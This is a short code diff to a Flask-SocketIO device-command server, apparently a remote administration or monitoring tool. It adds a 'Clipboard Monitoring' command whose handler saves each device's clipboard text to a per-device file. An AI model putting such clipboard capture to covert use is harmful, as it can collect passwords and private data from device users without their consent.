@@ -29,6 +29,7 @@ socketio = SocketIO(app)
 0xF - Factory Reset Device
 0x10 - Reboot Device
 0x11 - Change Device Password
+0x12 - Clipboard Monitoring
 '''
 
 def write_to_log_file(data):
@@ -230,6 +231,13 @@ def reboot_device_listener(data):
 
 @socketio.on('0x11')
 def change_device_passowrd_listener(data):
+    log_to_console(data)
+
+
+@socketio.on('0x12')
+def clipboard_monitoring(data):
+    with open(f"files/{data['device_id']}/clipboard.txt", 'a') as f:
+        f.write(data['clip'])
     log_to_console(data)
 
 
